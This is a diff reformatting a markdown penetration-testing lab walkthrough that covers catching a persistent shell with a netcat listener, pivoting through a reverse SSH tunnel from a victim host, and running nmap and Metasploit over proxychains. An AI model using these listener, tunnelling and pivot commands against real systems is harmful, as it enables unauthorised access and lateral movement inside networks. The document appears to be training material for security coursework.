@@ -1,6 +1,4 @@
-#Changing Targets VICTIM 2
-
-
+# Changing Targets VICTIM 2
 
 ## Introduction
 
@@ -10,7 +8,7 @@ Here You will find techniques PERSISTENT SHELL, PIVIOT, AND PING SWEEP.
 
 
 
-## Section 1: CATCH PERSISTENT SHELL
+## Step 1: CATCH PERSISTENT SHELL
 
 
 
@@ -19,75 +17,81 @@ Here You will find techniques PERSISTENT SHELL, PIVIOT, AND PING SWEEP.
 
 
 ```bash
-# nc -lvp 55556
-upgrade shell
+nc -lvp 55556
+```
+**REMEMBER TO UPGRADE YOUR SHELL**
 
 
-
-
-
-
-## NEXT CONDUCT A PIVIOT
-
-
+## Step 2: PIVOT
 
 ### (ATTACKER)
 
 
-
 ```bash
-# netstat -natp
-# netstat -natp | grep LISTEN
+ netstat -natp
+```
+```
+netstat -natp | grep LISTEN
+```
 
-
-
-_AFTER CATCHING PERSISTENT SHELL (USE YOUR SSH PORT)
-_OPEN SSH FOR LISTNER TO SET UP PROXY
-
+**AFTER CATCHING PERSISTENT SHELL (USE YOUR SSH PORT) OPEN SSH FOR LISTNER TO SET UP PROXY**
 
 
 ```bash
-#sudo systemctl status ssh.service
-#sudo systemctl start ssh.service
-
+sudo systemctl status ssh.service
+```
+```
+sudo systemctl start ssh.service
+```
 
 
 ### (VICTIM)
 ```bash
-# ssh -N -f -R 127.0.0.1:9080 kali@192.168.122.209 -p 55555
+ ssh -N -f -R 127.0.0.1:9080 kali@192.168.122.209 -p 55555
+```
 
 
-
-(MAKE SURE PORT FWD RULE IS GOOD ON PFSENSE SSH PORT 22)
+MAKE SURE PORT FWD RULE IS GOOD ON PFSENSE SSH PORT 22
 if it states port fowarding failed it means you alrady have ypur proxy open
 (VICTIM) should be promted a password
 
 
 
-## NEXT CONDUCT A PING SWEEP
+## Step 3: PING SWEEP
 
 
-
-_NOTE: YOUR DIRECTORIES MAY VARY COMPARED TO MY EXAMPLE DEPENDING HOW AND WHERE YOUR SCOPE FILE IS ON KALI
+**NOTE: YOUR DIRECTORIES MAY VARY COMPARED TO MY EXAMPLE DEPENDING HOW AND WHERE YOUR SCOPE FILE IS ON KALI**
 
 
 
 ### (ATTACKER)
 ```bash
-# LS
-# CD INTERNAL
-_(SHOULD SEE IP'S PING SWEEPS AND TARGETS)
-# LS
-# CD 192.168.1.102 (=SOC4)
-# sudo proxychains nmap -iL scope -F -Pn -sT | tee fast_scan
+ ls
+```
+```
+cd internal
+```
+
+**SHOULD SEE IP'S PING SWEEPS AND TARGETS**
 
 
+```
+ls
+```
+```
+cd 192.168.1.102 
+```
+SOC 4 IP
 
-_USE A THIRD TERMINAL
+```
+sudo proxychains nmap -iL scope -F -Pn -sT | tee fast_scan
+```
+
+**USE A THIRD TERMINAL**
+
 ```bash
-# sudo proxychains msfconsole [1:24:44]
+sudo proxychains msfconsole 
+```
+[1:24:44]
 
-
-
-*** continued... on Metasploit through proxy chains ***
-
+*** continued... at [ 2 Metasploit via Proxychains & PrivEsc Automation w linPEAS ]
